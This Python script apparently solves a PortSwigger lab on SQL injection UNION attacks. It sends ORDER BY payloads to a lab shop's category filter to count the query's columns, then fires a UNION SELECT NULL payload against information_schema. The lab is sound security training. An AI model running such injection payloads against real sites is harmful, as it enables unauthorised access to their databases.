import requests

session = requests.session()

burp0_url = "https://ac931fe11fd67218c0593f2600f20015.web-security-academy.net:443/filter?category=Tech+gifts"
burp0_cookies = {"session": "jAFZPxbLZfulrrF9ZKxHldljrhlfHzwL"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Dnt": "1", "Referer": "https://ac931fe11fd67218c0593f2600f20015.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
# session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)


# ######################  until here burp paste of request for python  ########################## #

# https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

cookies = burp0_cookies
headers = burp0_headers
number_of_columns = 0


def send_request_order_by(number: int):
    url = burp0_url + f"'+ORDER+BY+{number}--+-"
    # print(url)
    response = requests.get(url, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
    # print(response)
    if response.status_code == 200:
        return True
    else:
        return False

def send_payload(number_of_columns, burp0_url):
    sqli_payload = f"'+UNION+SELECT+{('NULL,+' * number_of_columns)[:-2]}+FROM+information_schema.tables--+-"
    loaded_url = str(burp0_url + sqli_payload)
    print(loaded_url)

    response = requests.get(loaded_url, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
    # dont need to add 'verify' value because verification is a default in recent urllib
    # just copy cacert.pem to: ./venv/lib/python3.9/site-packages/certifi/

    print(response)


if __name__ == '__main__':
    for i in range(10, 0, -1):
        print(f"trying {i}")
        if send_request_order_by(i):
            number_of_columns = i
            print(f"this is the number of columns to UNION BY:\n***   {i}    ***.\nUse it wisely")
            break
    send_payload(number_of_columns, burp0_url)


# PayLoad:
# UNION SELECT NULL,NULL,NULL FROM information_schema.tables--+-

